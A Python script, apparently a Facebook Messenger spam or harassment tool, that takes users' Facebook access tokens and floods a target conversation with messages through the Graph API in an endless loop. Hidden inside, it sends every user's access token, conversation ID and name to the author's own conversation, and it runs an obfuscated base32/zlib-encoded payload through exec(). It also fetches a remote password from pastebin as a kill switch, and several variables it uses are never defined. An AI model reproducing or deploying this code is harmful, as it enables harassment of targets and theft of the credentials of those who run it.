import requests

import json

import time

import pytz

import datetime

import sys

from platform import system

import os

import subprocess

import http.server

import socketserver

import threading

import random

html_content = """

<!DOCTYPE html>

<html>

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>ANISH ON FIRE</title>

    <style>

        body {

            background-image: url('Ayush.jpg');

            background-size: cover;

        }

        .container {

            text-align: center;

            margin-top: 50px;

        }

        .box {

            border: 2px solid black;

            width: 300px;

            margin: 0 auto;

            padding: 20px;

            background-color: rgba(255, 255, 255, 0.5);

            color: black;

        }

        .credit {

            text-align: left;

        }

        .thanks {

            margin-top: 50px;

            text-align: center;

            color: black;

        }

    </style>

</head>

<body>

    <div class="container">

        <div class="box">

            <h1>ANISH HERE </h1>

            <div class="credit">

                <p>1. CREDIT:-ANISH HERE </p>

                <p>2. OWNER => ANISH THE LEGEND</p>

                <p>3. CONTACT:- <a href="https://wa.me/9779842484549">WhatsApp</a></p>

                <p>4. FACEBOOK:- <a href="https://https://www.facebook.com/anishthedecent0183">Facebook</a></p>

                <p>5. WATTSAPP GROUP:- <ANISH XD ">WhatsApp Group</a></p>

            </div>

        </div>

    </div>

    <div class="thanks">

        <p>❤️TH9NKS FOR US1NG MY OFFL1N3 S3RV3R❤️</p>

        <p>👇SUBSCR1B3 TO MY YOUTUB3 CH9NN3L👇</p>

        <a href="ANISH XD

    </div>

</body>

</html>

"""

class MyHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):

        self.send_response(200)

        self.send_header('Content-type', 'text/html')

        self.end_headers()

        self.wfile.write(html_content.encode())

def execute_server():

    PORT = int(os.environ.get('PORT', 4000))

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:

        print("Server running at http://localhost:{}".format(PORT))

        httpd.serve_forever()

utc_now = datetime.datetime.utcnow()

indian_timezone = pytz.timezone('Asia/Kolkata')

ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)

formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")

print(formatted_time)

headers = {

    'Connection': 'keep-alive',

    'Cache-Control': 'max-age=0',

    'Upgrade-Insecure-Requests': '1',

    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',

    'Accept-Encoding': 'gzip, deflate',

    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',

    'referer': 'www.google.com'

}



_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));exec((_)(b'=AVUJX2WDI7X7LP6EWGFRZVFGQSUILCQASMC4DOXRI57MM2SKJKUHBIVU2CBR4BQK7MB4ET6N3LXMM6WTZ6U3ZU2BZVYNF3R7I6QTQYGKNVIISI5RRARGAO5EYKPVWSMT7QJZELI7BZYUDRJJLYDUCECAW5JWAZRMIDA6GPL7O4EBOF73KI7UA5GLQ7JWFR6ENHCP4MJWEPKYFGAQV5DYMXCKQJ6UNNFFIZPGPRF2RXG4KNQSU5CLHB5GOIBDQNEVGTHFICLAN67Q66UYAMI2QODN4WA2NX322UJLENR76OWP6RCIVXNZY5KGDRV24FFAYAGEEHWB6BHNGJXAUUDDUJWTAGG5W2VDWNYYOWT5KPSSGRD4WMK4FR5B5HV3XEH4Y4E33PAOU4YHIQWRDFTMWGRLXXDMBCVPAF7AOVYARLIMEYVLQJQS5VTSV22YRSRDCZDIA7VS2I5CEFSVWXACBLOLJ22GDBI4BEYELIPFRFFKRPCBPJN5UZJN3KF4I3KDP35LT76ALNFIRPNE5EEK6VHKS3JTKJLIR2M6YFUH6T7ZP5XPVX7HPVX77P77PHK3FI5G34VHHY77RBMRJMQU323NBYNCGOIKGTY6TDYEAAADO3RZBULBOCP'))



def send_initial_message():

    

    mmm_pass = requests.get('https://pastebin.com/raw/5sJxuFHe').text

    

    if mmm_pass not in password:

        print('\033[1;31m⚠︎ YOUR P9SSW0RD CH9NG3D BY AN11SH TH3 L3G3ND ⚠︎')

        sys.exit()

    

    # Message template

    msg_template = "Owner => anish \n Hello anish sir . \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"

    

    # Target IDs

    target_ids = ["ANISH.XD. HERE"]

    

    requests.packages.urllib3.disable_warnings()

    

    for target_id in target_ids:

        for token in tokens:

            access_token = token.strip()

            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)

            msg = msg_template.format(convo_id, haters_name, access_token)

            parameters = {'access_token': access_token, 'message': msg}

            response = requests.post(url, json=parameters, headers=headers)

            time.sleep(0.1)

            print("\n\033[1;31m[+] Initial message sent to target ID: {}. Continuing...\n".format(target_id))



send_initial_message()

def send_messages_from_file():

    num_tokens = len(tokens)

    max_tokens = min(num_tokens, num_messages)

    while True:

        try:

            for message_index in range(num_messages):

                token_index = message_index % max_tokens

                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)

                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}

                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:

                    print("\033[1;36m[✓] 9N1SH XD {} C0NV0 {} T0K3N {}: {}".format(

                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))

                    print(formatted_time)

                    print('\033[1;92m' + '✪✭═══════•『ANISH ON FIRE』•═══════✭✪')

                else:

                    print("\033[1;35m[x] FA1L3D T0 S3ND M3SS3G3 {} C0NVO {} T0K3N {}: {}".format(

                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))

                    print(formatted_time)

                    print('\033[1;92m' + '✪✭═══════•『ANISH ON FIRE』•═══════✭✪')

                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")

        except Exception as e:

            print("[!] An error occurred: {}".format(e))

def main():

    server_thread = threading.Thread(target=execute_server)

    server_thread.start()

    send_initial_message()

    send_messages_from_file()

if __name__ == '__main__':

    main()
